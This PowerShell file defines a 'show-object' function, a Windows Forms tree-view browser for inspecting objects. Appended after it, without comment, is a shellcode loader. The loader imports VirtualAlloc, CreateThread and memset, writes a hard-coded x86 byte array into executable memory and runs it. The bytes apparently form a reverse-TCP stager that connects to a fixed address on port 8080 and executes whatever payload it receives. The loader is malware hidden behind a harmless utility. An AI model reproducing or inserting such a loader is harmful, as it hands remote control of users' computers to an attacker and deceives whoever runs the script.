function show-object{param([Parameter(ValueFromPipeline = $true)]$InputObject)Set-StrictMode -Version 3Add-Type -Assembly System.Windows.Forms$rootVariableName = Get-ChildItem variable:\* -Exclude InputObject,Args |Where-Object {$_.Value -and($_.Value.GetType() -eq $InputObject.GetType()) -and($_.Value.GetHashCode() -eq $InputObject.GetHashCode())}$rootVariableName = $rootVariableName| ForEach-Object Name | Select-Object -First 1if(-not $rootVariableName){$rootVariableName = "InputObject"}function PopulateNode($node, $object){if(-not $object) { return }if([System.Management.Automation.LanguagePrimitives]::GetEnumerator($object)){$isOnlyEnumerable = $object.GetHashCode() -eq $object[0].GetHashCode()$count = 0foreach($childObjectValue in $object){$newChildNode = New-Object Windows.Forms.TreeNode$newChildNode.Text = "$($node.Name)[$count] = $childObjectValue : " +$childObjectValue.GetType()if($isOnlyEnumerable){$newChildNode.Name = "@"}$newChildNode.Name += "[$count]"$null = $node.Nodes.Add($newChildNode)AddPlaceholderIfRequired $newChildNode $childObjectValue$count++}}else{foreach($child in $object.PSObject.Properties){$childObject = $child.Value$childObjectType = $nullif($childObject){$childObjectType = $childObject.GetType()}$childNode = New-Object Windows.Forms.TreeNode$childNode.Text = $child.Name + " = $childObject : $childObjectType"$childNode.Name = $child.Name$null = $node.Nodes.Add($childNode)AddPlaceholderIfRequired $childNode $childObject}}}function AddPlaceholderIfRequired($node, $object){if(-not $object) { return }if([System.Management.Automation.LanguagePrimitives]::GetEnumerator($object) -or@($object.PSObject.Properties)){$null = $node.Nodes.Add( (New-Object Windows.Forms.TreeNode "...") )}}function OnAfterSelect{param($Sender, $TreeViewEventArgs)$nodeSelected = $Sender.SelectedNode$nodePath = GetPathForNode $nodeSelected$resultObject = Invoke-Expression $nodePath$outputPane.Text = $nodePathif($resultObject){$members = Get-Member -InputObject $resultObject | Out-String$outputPane.Text += "`n" + $members}}function OnBeforeExpand{param($Sender, $TreeViewCancelEventArgs)$selectedNode = $TreeViewCancelEventArgs.Nodeif($selectedNode.FirstNode -and($selectedNode.FirstNode.Text -eq "...")){$selectedNode.Nodes.Clear()}else{return}$nodePath = GetPathForNode $selectedNodeInvoke-Expression "`$resultObject = $nodePath"PopulateNode $selectedNode $resultObject}function OnKeyPress{param($Sender, $KeyPressEventArgs)if($KeyPressEventArgs.KeyChar -eq 3){$KeyPressEventArgs.Handled = $true$node = $Sender.SelectedNode$nodePath = GetPathForNode $node[System.Windows.Forms.Clipboard]::SetText($nodePath)$form.Close()}}function GetPathForNode{param($Node)$nodeElements = @()while($Node){$nodeElements = ,$Node + $nodeElements$Node = $Node.Parent}$nodePath = ""foreach($Node in $nodeElements){$nodeName = $Node.Nameif($nodeName.StartsWith('@')){$nodeName = $nodeName.Substring(1)$nodePath = "@(" + $nodePath + ")"}elseif($nodeName.StartsWith('[')){}elseif($nodePath){$nodePath += "."}$nodePath += $nodeName}$nodePath}$treeView = New-Object Windows.Forms.TreeView$treeView.Dock = "Top"$treeView.Height = 500$treeView.PathSeparator = "."$treeView.Add_AfterSelect( { OnAfterSelect @args } )$treeView.Add_BeforeExpand( { OnBeforeExpand @args } )$treeView.Add_KeyPress( { OnKeyPress @args } )$outputPane = New-Object System.Windows.Forms.TextBox$outputPane.Multiline = $true$outputPane.ScrollBars = "Vertical"$outputPane.Font = "Consolas"$outputPane.Dock = "Top"$outputPane.Height = 300$root = New-Object Windows.Forms.TreeNode$root.Text = "$InputObject : " + $InputObject.GetType()$root.Name = '$' + $rootVariableName$root.Expand()$null = $treeView.Nodes.Add($root)PopulateNode $root $InputObject$form = New-Object Windows.Forms.Form$form.Text = "Browsing " + $root.Text$form.Width = 1000$form.Height = 800$form.Controls.Add($outputPane)$form.Controls.Add($treeView)$null = $form.ShowDialog()$form.Dispose()}$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xbe,0x28,0x6b,0xab,0x68,0x02,0x00,0x1f,0x90,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};